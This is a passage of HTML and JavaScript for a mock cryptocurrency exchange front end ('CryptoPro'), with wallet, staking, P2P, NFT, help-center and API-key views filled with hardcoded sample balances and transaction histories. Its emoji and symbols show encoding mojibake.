      <button onclick="nextTourStep()" style="flex:2;padding:7px;background:var(--green);border:none;border-radius:8px;color:#000;font-size:12px;font-weight:700;cursor:pointer">${tourStep<TOUR_STEPS.length-1?'Next â†’':'Finish ðŸŽ‰'}</button>
    </div>`;
  overlay.appendChild(spotlight);overlay.appendChild(tooltip);
  document.body.appendChild(overlay);
}
function nextTourStep(){tourStep++;showTourStep();}
function clearTour(){$('tourOverlay')?.remove();}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DEPOSIT & WITHDRAWAL HISTORY
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const depositHistory=[
  {date:'Jan 27 14:32',method:'M-Pesa',amount:'+$200',status:'Completed',txid:'MP2024012701'},
  {date:'Jan 25 09:18',method:'USDT TRC20',amount:'+$500',status:'Completed',txid:'0xabc123...'},
  {date:'Jan 20 16:44',method:'Bank Wire',amount:'+$1,000',status:'Completed',txid:'BANK-4421'},
  {date:'Jan 15 11:02',method:'Credit Card',amount:'+$150',status:'Completed',txid:'CC-8821'},
];
const withdrawHistory=[
  {date:'Jan 26 18:20',method:'USDT TRC20',amount:'-$300',status:'Completed',txid:'0xdef456...'},
  {date:'Jan 22 10:14',method:'Bank Wire',amount:'-$800',status:'Completed',txid:'BANK-3312'},
  {date:'Jan 18 14:55',method:'Bitcoin',amount:'-$250',status:'Processing',txid:'Pending'},
];
function buildDepositHistory(){
  const el=$('depositHistoryBody');if(!el)return;
  el.innerHTML=depositHistory.map(d=>`
    <tr class="hist-row">
      <td style="font-size:11px;color:var(--text3)">${d.date}</td>
      <td style="font-weight:600">${d.method}</td>
      <td style="font-family:var(--font-mono);font-weight:700;color:var(--green)">${d.amount}</td>
      <td><span style="font-size:10px;font-weight:700;padding:2px 7px;border-radius:4px;background:var(--green3);color:var(--green)">${d.status}</span></td>
      <td style="font-family:var(--font-mono);font-size:10px;color:var(--text3)">${d.txid}</td>
    </tr>`).join('');
}
function buildWithdrawHistory(){
  const el=$('withdrawHistoryBody');if(!el)return;
  el.innerHTML=withdrawHistory.map(d=>`
    <tr class="hist-row">
      <td style="font-size:11px;color:var(--text3)">${d.date}</td>
      <td style="font-weight:600">${d.method}</td>
      <td style="font-family:var(--font-mono);font-weight:700;color:var(--red)">${d.amount}</td>
      <td><span style="font-size:10px;font-weight:700;padding:2px 7px;border-radius:4px;background:${d.status==='Completed'?'var(--green3)':'rgba(255,215,64,.1)'};color:${d.status==='Completed'?'var(--green)':'var(--yellow)'}">${d.status}</span></td>
      <td style="font-family:var(--font-mono);font-size:10px;color:var(--text3)">${d.txid}</td>
    </tr>`).join('');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ALERT HISTORY
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const alertHistory=[
  {pair:'BTC/USDT',type:'above',price:67000,triggered:'Jan 27 14:32',status:'Triggered'},
  {pair:'ETH/USDT',type:'below',price:3400,triggered:'Jan 25 09:00',status:'Triggered'},
  {pair:'SOL/USDT',type:'above',price:180,triggered:'Pending',status:'Active'},
];
function buildAlertHistory(){
  const el=$('alertHistoryList');if(!el)return;
  el.innerHTML=alertHistory.map(a=>`
    <div class="alert-hist-row">
      <span class="alert-active" style="color:${a.status==='Active'?'var(--green)':'var(--text3)'}">${a.status==='Active'?'â—':'â—‹'}</span>
      <span style="font-weight:700">${a.pair} <span style="font-weight:400;color:var(--text3)">${a.type==='above'?'rises above':'falls below'} $${formatNum(a.price,0)}</span></span>
      <span style="font-size:10px;color:var(--text3)">${a.triggered}</span>
      <span style="font-size:10px;font-weight:700;padding:2px 7px;border-radius:4px;background:${a.status==='Active'?'var(--green3)':'var(--bg3)'};color:${a.status==='Active'?'var(--green)':'var(--text3)'}">${a.status}</span>
    </div>`).join('');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// EXTENDED DASHBOARD SECTIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const _origShowDashSection=window.showDashSection||function(){};
window.showDashSection=function(sec){
  const allSecs=['overview','positions','history','referral','settings','tax','subaccounts','dephistory','wdhistory','alerthistory'];
  allSecs.forEach(s=>{
    const el=$(`dashSection${s.charAt(0).toUpperCase()+s.slice(1)}`);
    if(el)el.style.display=s===sec?'':'none';
  });
  if(sec==='overview'){drawPerfChart();drawAllocChart();drawBalMiniChart();buildDashPositions();buildRecentTrades();buildMarketSnap();buildLiveTxFeed();buildStreakDots();buildRecActions();}
  if(sec==='positions'){buildPositionsSection();buildPosHistory();}
  if(sec==='history'){buildTradeHistory();}
  if(sec==='settings'){buildDeviceList();buildIPWhitelist();buildPriceAlertsList();}
  if(sec==='tax'){buildTaxReports();}
  if(sec==='subaccounts'){buildSubAccounts();}
  if(sec==='dephistory'){buildDepositHistory();}
  if(sec==='wdhistory'){buildWithdrawHistory();}
  if(sec==='alerthistory'){buildAlertHistory();}
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// LAYER BUILDER â€” call all builders when layers open
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const _origShowLayer=window.showLayer;
window.showLayer=function(id){
  document.querySelectorAll('.layer').forEach(l=>l.classList.remove('active'));
  const el=$(id);if(el){el.classList.add('active');window.scrollTo(0,0);}
  updateMBN(id);
  // Trigger layer-specific builders
  setTimeout(()=>{
    if(id==='newsLayer')buildNews();
    if(id==='stakingLayer')buildStaking();
    if(id==='launchpadLayer')buildLaunchpad();
    if(id==='p2pLayer')buildP2P();
    if(id==='walletLayer')buildWallet();
    if(id==='analyticsLayer'){buildAnalytics();setTimeout(buildMultiChart,300);}
    if(id==='nftLayer')buildNFT();
    if(id==='supportLayer')buildSupport();
    if(id==='apiKeysLayer')buildApiKeys();
    if(id==='feeLayer')buildFeeSchedule();
    if(id==='scannerLayer')buildScanner();
    if(id==='watchlistLayer')buildWatchlist();
    if(id==='heatmapLayer')buildHeatmap();
    if(id==='leaderboardLayer')buildLeaderboard();
    if(id==='achievementsLayer')buildAchievements();
    if(id==='chartLayer'){initTVChart();drawDepthChart();}
    if(id==='tradingLayer')initTVTradingChart();
    if(id==='dashboardLayer'&&STATE.loggedIn){drawPerfChart();drawAllocChart();drawBalMiniChart();buildDashPositions();buildRecentTrades();buildMarketSnap();buildLiveTxFeed();}
  },150);
};

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PLAY SOUND ON ORDER (patch confirmOrder)
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const _origConfirmOrder=window.confirmOrder||function(){};
window.confirmOrder=function(){
  _origConfirmOrder();
  playOrderSound(STATE.orderSide);
};

</script>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• NEWS LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="newsLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ“° Crypto News</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Live market news and analysis</div>
      </div>
      <div style="display:flex;gap:8px;flex-wrap:wrap" id="newsFilterBtns">
        <button class="scanner-filter active" onclick="filterNews('all',this)">All</button>
        <button class="scanner-filter" onclick="filterNews('btc',this)">Bitcoin</button>
        <button class="scanner-filter" onclick="filterNews('eth',this)">Ethereum</button>
        <button class="scanner-filter" onclick="filterNews('defi',this)">DeFi</button>
        <button class="scanner-filter" onclick="filterNews('nft',this)">NFT</button>
        <button class="scanner-filter" onclick="filterNews('reg',this)">Regulation</button>
        <button class="scanner-filter" onclick="filterNews('macro',this)">Macro</button>
      </div>
    </div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px" id="newsGrid"></div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• STAKING LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="stakingLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ’Ž Staking & Earn</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Earn passive income on your crypto holdings</div>
      </div>
      <div style="display:flex;gap:12px;align-items:center">
        <div style="font-size:13px;color:var(--text2)">Total Earning: <strong style="color:var(--green);font-family:var(--font-mono)" id="totalStakeEarning">+$0.0000/day</strong></div>
      </div>
    </div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px" id="stakingGrid"></div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• LAUNCHPAD LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="launchpadLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸš€ Token Launchpad</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Participate in vetted IDOs before they hit the market</div>
      </div>
      <div style="display:flex;gap:8px">
        <button class="iv-btn active" onclick="this.parentElement.querySelectorAll('.iv-btn').forEach(b=>b.classList.remove('active'));this.classList.add('active');buildLaunchpad()">All</button>
        <button class="iv-btn" onclick="this.parentElement.querySelectorAll('.iv-btn').forEach(b=>b.classList.remove('active'));this.classList.add('active');buildLaunchpad()">Live</button>
        <button class="iv-btn" onclick="this.parentElement.querySelectorAll('.iv-btn').forEach(b=>b.classList.remove('active'));this.classList.add('active');buildLaunchpad()">Upcoming</button>
        <button class="iv-btn" onclick="this.parentElement.querySelectorAll('.iv-btn').forEach(b=>b.classList.remove('active'));this.classList.add('active');buildLaunchpad()">Ended</button>
      </div>
    </div>
    <div style="background:linear-gradient(135deg,rgba(0,230,118,.1),rgba(0,229,255,.05));border:1px solid rgba(0,230,118,.2);border-radius:var(--r-xl);padding:16px 20px;margin-bottom:20px;display:flex;align-items:center;gap:16px;flex-wrap:wrap">
      <div style="font-size:24px">ðŸ’Ž</div>
      <div><div style="font-weight:800;font-size:14px;margin-bottom:2px">Hold CPT tokens to get guaranteed allocation</div><div style="font-size:12px;color:var(--text2)">Silver+ VIP members get priority access to all IDOs with no lottery required</div></div>
      <button class="btn btn-green" style="margin-left:auto" onclick="showToast('ðŸ’Ž Redirecting to CPT token purchase...','green')">Get Guaranteed Slot</button>
    </div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:16px" id="launchpadGrid"></div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• P2P LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="p2pLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ¤ P2P Trading</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Trade directly with other users â€” 0% fees, any payment method</div>
      </div>
      <button class="btn btn-green" onclick="showToast('ðŸ“ Post ad feature â€” complete KYC first','blue')">+ Post Ad</button>
    </div>
    <div style="display:flex;gap:4px;margin-bottom:16px">
      <button class="ot-btn buy active p2p-tab-btn" onclick="setP2PTab('buy',this)" style="flex:1;padding:12px;border:none;font-size:13px;font-weight:800;cursor:pointer;font-family:var(--font-mono);background:var(--green3);color:var(--green);border-bottom:2px solid var(--green)">Buy Crypto</button>
      <button class="ot-btn sell p2p-tab-btn" onclick="setP2PTab('sell',this)" style="flex:1;padding:12px;border:none;font-size:13px;font-weight:800;cursor:pointer;font-family:var(--font-mono);background:var(--bg2);color:var(--text3)">Sell Crypto</button>
    </div>
    <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
      <select style="padding:7px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:12px" onchange="filterP2P()">
        <option>USDT</option><option>BTC</option><option>ETH</option><option>BNB</option>
      </select>
      <select style="padding:7px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:12px">
        <option>All Payment Methods</option><option>M-Pesa</option><option>Bank Transfer</option><option>PayPal</option><option>Wise</option>
      </select>
      <input type="number" placeholder="Amount" style="padding:7px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:12px;width:140px">
      <button class="btn btn-green" onclick="buildP2P()">Search</button>
    </div>
    <div id="p2pAdsList"></div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• WALLET LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="walletLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ‘› My Wallet</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Total Balance: <strong style="color:var(--green);font-family:var(--font-mono)" id="walletTotalUSD">$0.00</strong></div>
      </div>
      <div style="display:flex;gap:8px">
        <button class="btn btn-green" onclick="showLayer('depositLayer')">+ Deposit</button>
        <button class="btn btn-outline" onclick="showWithdrawModal()">â†‘ Withdraw</button>
        <button class="btn btn-outline" onclick="showToast('ðŸ”„ Convert â€” select assets to swap','blue')">â‡„ Convert</button>
      </div>
    </div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(160px,1fr));gap:12px;margin-bottom:20px">
      <div class="analytics-stat"><span class="as-val text-green">$12,500</span><span class="as-lbl">Total Balance</span></div>
      <div class="analytics-stat"><span class="as-val">$8,250</span><span class="as-lbl">Available</span></div>
      <div class="analytics-stat"><span class="as-val" style="color:var(--yellow)">$3,840</span><span class="as-lbl">In Positions</span></div>
      <div class="analytics-stat"><span class="as-val text-green">+$410</span><span class="as-lbl">Unrealized PnL</span></div>
    </div>
    <div class="dash-card" style="padding:0;overflow:hidden">
      <div style="padding:14px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between">
        <span style="font-family:var(--font-display);font-size:14px;font-weight:700">Asset Holdings</span>
        <div style="display:flex;gap:8px">
          <button class="btn btn-outline" style="font-size:11px;padding:4px 10px" onclick="showToast('ðŸ“¥ Exporting wallet data...','blue')">Export</button>
          <input type="text" placeholder="Search assets..." style="padding:5px 10px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-sm);color:var(--text1);font-size:12px">
        </div>
      </div>
      <div id="walletAssetList" style="padding:0 16px"></div>
    </div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:16px">
      <div class="dash-card">
        <div class="dc-header"><span class="dc-title">ðŸ“¥ Deposit History</span><span class="dc-link" onclick="showDashSection('dephistory');showLayer('dashboardLayer')">Full history â†’</span></div>
        <table style="width:100%;border-collapse:collapse"><tbody id="depositHistoryBody"></tbody></table>
      </div>
      <div class="dash-card">
        <div class="dc-header"><span class="dc-title">ðŸ“¤ Withdrawal History</span><span class="dc-link" onclick="showDashSection('wdhistory');showLayer('dashboardLayer')">Full history â†’</span></div>
        <table style="width:100%;border-collapse:collapse"><tbody id="withdrawHistoryBody"></tbody></table>
      </div>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• ANALYTICS LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="analyticsLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ“Š Portfolio Analytics</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Deep performance insights and trade statistics</div>
      </div>
      <div style="display:flex;gap:8px">
        <button class="iv-btn active" onclick="document.querySelectorAll('#analyticsIntervals .iv-btn').forEach(b=>b.classList.remove('active'));this.classList.add('active');buildAnalytics()">7D</button>
        <button class="iv-btn" id="analyticsIntervals" onclick="document.querySelectorAll('.iv-btn').forEach(b=>b.classList.remove('active'));this.classList.add('active');buildAnalytics()">30D</button>
        <button class="iv-btn" onclick="document.querySelectorAll('.iv-btn').forEach(b=>b.classList.remove('active'));this.classList.add('active');buildAnalytics()">90D</button>
        <button class="iv-btn" onclick="document.querySelectorAll('.iv-btn').forEach(b=>b.classList.remove('active'));this.classList.add('active');buildAnalytics()">1Y</button>
        <button class="btn btn-outline" style="font-size:12px" onclick="showToast('ðŸ“¥ Exporting analytics report...','blue')">Export PDF</button>
      </div>
    </div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:12px;margin-bottom:20px" id="analyticsStatsGrid"></div>
    <div class="dash-two-col" style="margin-bottom:16px">
      <div class="dash-card">
        <div class="dc-header"><span class="dc-title">Portfolio Growth</span></div>
        <div style="height:220px;position:relative" id="analyticsPerf"></div>
      </div>
      <div class="dash-card">
        <div class="dc-header"><span class="dc-title">Multi-Chart View</span><span style="font-size:11px;color:var(--text3)">Click any chart to open full view</span></div>
        <div id="multiChartContainer"></div>
      </div>
    </div>
    <div class="dash-card">
      <div class="dc-header"><span class="dc-title">ðŸ”” Alert History</span><button class="btn btn-green" style="font-size:12px;padding:6px 14px" onclick="showPriceAlertModal()">+ New Alert</button></div>
      <div id="alertHistoryList"></div>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• NFT LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="nftLayer">
  <div style="padding:20px 24px">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ–¼ï¸ NFT Marketplace</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Discover, buy, and sell NFTs from top collections</div>
      </div>
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <select style="padding:7px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:12px">
          <option>All Collections</option><option>CryptoPunks</option><option>BAYC</option><option>Azuki</option>
        </select>
        <select style="padding:7px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:12px">
          <option>Sort: Price High</option><option>Sort: Price Low</option><option>Sort: Recently Listed</option>
        </select>
        <button class="btn btn-green" onclick="showToast('ðŸ–¼ï¸ Connect wallet to list your NFTs','blue')">+ List NFT</button>
      </div>
    </div>
    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-bottom:16px">
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center"><div style="font-family:var(--font-mono);font-size:22px;font-weight:900;color:var(--purple)">$42M</div><div style="font-size:11px;color:var(--text3);margin-top:3px">24h Volume</div></div>
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center"><div style="font-family:var(--font-mono);font-size:22px;font-weight:900;color:var(--cyan)">12,840</div><div style="font-size:11px;color:var(--text3);margin-top:3px">Active Listings</div></div>
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center"><div style="font-family:var(--font-mono);font-size:22px;font-weight:900;color:var(--yellow)">2.5%</div><div style="font-size:11px;color:var(--text3);margin-top:3px">Platform Fee</div></div>
    </div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:16px" id="nftGrid"></div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• SUPPORT LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="supportLayer">
  <div style="padding:20px 24px;max-width:900px;margin:0 auto">
    <div style="font-family:var(--font-display);font-size:22px;font-weight:800;margin-bottom:4px">ðŸ’¬ Help Center</div>
    <div style="font-size:13px;color:var(--text2);margin-bottom:20px">Get help from our team or browse the FAQ</div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px;margin-bottom:24px">
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center;cursor:pointer;transition:all .2s" onclick="startLiveChat()" onmouseover="this.style.borderColor='var(--green)'" onmouseout="this.style.borderColor=''">
        <div style="font-size:28px;margin-bottom:6px">ðŸ’¬</div><div style="font-weight:700;font-size:13px">Live Chat</div><div style="font-size:11px;color:var(--green);margin-top:2px">~2 min wait</div>
      </div>
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center;cursor:pointer;transition:all .2s" onclick="showToast('ðŸ“§ Email support: felixkoskey278@gmail.com','blue',5000)" onmouseover="this.style.borderColor='var(--blue)'" onmouseout="this.style.borderColor=''">
        <div style="font-size:28px;margin-bottom:6px">ðŸ“§</div><div style="font-weight:700;font-size:13px">Email Support</div><div style="font-size:11px;color:var(--text3);margin-top:2px">Within 2 hours</div>
      </div>
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center;cursor:pointer;transition:all .2s" onclick="showToast('ðŸ“± WhatsApp: +254759401893','blue',5000)" onmouseover="this.style.borderColor='var(--green)'" onmouseout="this.style.borderColor=''">
        <div style="font-size:28px;margin-bottom:6px">ðŸ“±</div><div style="font-weight:700;font-size:13px">WhatsApp</div><div style="font-size:11px;color:var(--text3);margin-top:2px">+254759401893</div>
      </div>
      <div style="background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center;cursor:pointer;transition:all .2s" onclick="startTour()" onmouseover="this.style.borderColor='var(--purple)'" onmouseout="this.style.borderColor=''">
        <div style="font-size:28px;margin-bottom:6px">ðŸŽ“</div><div style="font-weight:700;font-size:13px">Platform Tour</div><div style="font-size:11px;color:var(--text3);margin-top:2px">Interactive guide</div>
      </div>
    </div>
    <div class="dash-two-col">
      <div class="dash-card">
        <div class="dc-header"><span class="dc-title">â“ FAQ</span></div>
        <div id="supportFAQ"></div>
      </div>
      <div style="display:flex;flex-direction:column;gap:16px">
        <div class="dash-card">
          <div class="dc-header"><span class="dc-title">ðŸŽ« Submit Ticket</span></div>
          <div class="form-group">
            <label class="form-label">Subject</label>
            <div class="input-wrap"><span class="input-icon">ðŸ“</span><input type="text" class="form-input" id="ticketSubject" placeholder="Describe your issue briefly"></div>
          </div>
          <div class="form-group">
            <label class="form-label">Message</label>
            <textarea style="width:100%;padding:10px 14px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);color:var(--text1);font-size:13px;font-family:var(--font-body);resize:vertical;min-height:100px;outline:none" id="ticketMessage" placeholder="Describe your issue in detail..."></textarea>
          </div>
          <button class="btn-auth" onclick="submitSupportTicket()">Submit Ticket</button>
        </div>
        <div class="dash-card">
          <div class="dc-header"><span class="dc-title">ðŸŽ« My Tickets</span></div>
          <div id="supportTickets"></div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• API KEYS LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="apiKeysLayer">
  <div style="padding:20px 24px;max-width:800px;margin:0 auto">
    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;flex-wrap:wrap;gap:10px">
      <div>
        <div style="font-family:var(--font-display);font-size:22px;font-weight:800">ðŸ”‘ API Keys</div>
        <div style="font-size:13px;color:var(--text2);margin-top:4px">Connect trading bots and third-party apps</div>
      </div>
      <button class="btn btn-green" onclick="createApiKey()">+ Create API Key</button>
    </div>
    <div style="background:rgba(255,215,64,.08);border:1px solid rgba(255,215,64,.2);border-radius:var(--r-xl);padding:14px 18px;margin-bottom:20px;font-size:13px;color:var(--yellow)">
      âš ï¸ Never share your API keys. CryptoPro staff will never ask for them. Enable IP restriction for maximum security.
    </div>
    <div class="dash-card">
      <div class="dc-header"><span class="dc-title">Your API Keys</span><span style="font-size:12px;color:var(--text3)">Max 5 keys per account</span></div>
      <div id="apiKeysList"></div>
    </div>
    <div class="dash-card" style="margin-top:16px">
      <div class="dc-header"><span class="dc-title">ðŸ“š API Documentation</span></div>
      <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:10px">
        <div style="background:var(--bg2);border-radius:var(--r-lg);padding:14px;cursor:pointer;transition:all .2s" onclick="showToast('ðŸ“– Opening REST API docs...','blue')" onmouseover="this.style.background='var(--bg3)'" onmouseout="this.style.background='var(--bg2)'">
          <div style="font-size:20px;margin-bottom:6px">ðŸ“¡</div><div style="font-weight:700;font-size:13px">REST API</div><div style="font-size:11px;color:var(--text3)">HTTP endpoints</div>
        </div>
        <div style="background:var(--bg2);border-radius:var(--r-lg);padding:14px;cursor:pointer;transition:all .2s" onclick="showToast('ðŸ”Œ Opening WebSocket docs...','blue')" onmouseover="this.style.background='var(--bg3)'" onmouseout="this.style.background='var(--bg2)'">
          <div style="font-size:20px;margin-bottom:6px">ðŸ”Œ</div><div style="font-weight:700;font-size:13px">WebSocket</div><div style="font-size:11px;color:var(--text3)">Real-time streams</div>
        </div>
        <div style="background:var(--bg2);border-radius:var(--r-lg);padding:14px;cursor:pointer;transition:all .2s" onclick="showToast('ðŸ Opening Python SDK...','blue')" onmouseover="this.style.background='var(--bg3)'" onmouseout="this.style.background='var(--bg2)'">
          <div style="font-size:20px;margin-bottom:6px">ðŸ</div><div style="font-weight:700;font-size:13px">Python SDK</div><div style="font-size:11px;color:var(--text3)">pip install cryptopro</div>
        </div>
        <div style="background:var(--bg2);border-radius:var(--r-lg);padding:14px;cursor:pointer;transition:all .2s" onclick="showToast('ðŸ“¦ Opening Node.js SDK...','blue')" onmouseover="this.style.background='var(--bg3)'" onmouseout="this.style.background='var(--bg2)'">
          <div style="font-size:20px;margin-bottom:6px">ðŸ“¦</div><div style="font-weight:700;font-size:13px">Node.js SDK</div><div style="font-size:11px;color:var(--text3)">npm i cryptopro</div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• FEE SCHEDULE LAYER â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• -->
<div class="layer" id="feeLayer">
  <div style="padding:20px 24px;max-width:900px;margin:0 auto">
    <div style="font-family:var(--font-display);font-size:22px;font-weight:800;margin-bottom:4px">ðŸ’² Fee Schedule</div>
    <div style="font-size:13px;color:var(--text2);margin-bottom:20px">VIP tiers unlock lower fees and exclusive benefits</div>
    <div class="dash-card" style="padding:0;overflow:hidden;margin-bottom:16px">
      <table class="fee-table">
        <thead><tr><th>VIP Tier</th><th>30D Volume</th><th>Maker Fee</th><th>Taker Fee</th><th>Withdraw Fee</th></tr></thead>
        <tbody id="feeTableBody"></tbody>
      </table>
    </div>
    <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px">
